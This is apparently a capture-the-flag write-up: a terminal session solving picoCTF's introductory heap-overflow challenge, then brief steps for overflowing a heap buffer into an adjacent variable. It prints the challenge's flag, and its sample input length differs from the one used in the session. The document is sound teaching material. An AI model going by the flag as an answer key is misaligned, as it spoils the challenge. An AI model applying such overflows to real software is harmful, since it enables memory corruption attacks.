@@ -1,0 +1,54 @@
+Enter your choice: 2
+Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 1
+Heap State:
++-------------+----------------+
+[*] Address   ->   Heap Data   
++-------------+----------------+
+[*]   0x55bb77d302b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
++-------------+----------------+
+[*]   0x55bb77d302d0  ->   AAAA
++-------------+----------------+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 3
+
+
+Take a look at my variable: safe_var = AAAA
+
+
+1. Print Heap:          (print the current state of the heap)
+2. Write to buffer:     (write to your own personal block of data on the heap)
+3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
+4. Print Flag:          (Try to print the flag, good luck)
+5. Exit
+
+Enter your choice: 4
+
+YOU WIN
+picoCTF{my_first_heap_overflow_c3935a08}
+
+
+overwrite the input_data buffer to overflow into the safe_var variable. Here's how you can do it:
+
+Choose option 2 to write data to input_data.
+Provide input that exceeds the allocated size of input_data, causing a buffer overflow.
+Overflow into the memory space allocated for safe_var, changing its value to something other than "bico".
+Choose option 4 to print the flag. If safe_var is not "bico", the win condition will be met, and the flag will be printed.
+Here's a sample input to achieve this:
+
+Choose option 2.
+Enter a string longer than the allocated size for input_data, such as "AAAAAAAAAAAAAAAAAAAAAA".
+Choose option 4 to check if the exploit was successful and the flag was printed.
